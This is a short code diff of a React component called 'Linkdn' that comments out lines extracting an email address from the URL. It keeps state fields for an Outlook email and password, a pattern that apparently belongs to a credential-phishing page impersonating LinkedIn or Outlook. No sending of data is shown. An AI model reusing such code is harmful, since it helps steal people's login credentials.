@@ -11,9 +11,9 @@ const Linkdn = ()=>{
 
     const refreshh = ()=> window.location.reload();
 
-    const emailInTheURL = window.location.href;
-    const sliceEqualSign = emailInTheURL.indexOf("=");
-    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
+    // const emailInTheURL = window.location.href;
+    // const sliceEqualSign = emailInTheURL.indexOf("=");
+    // const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
 
     const [outlookEmail, setOutlookEmail] = useState('');
     const [outlookPassword, setOulookPassword] = useState('');
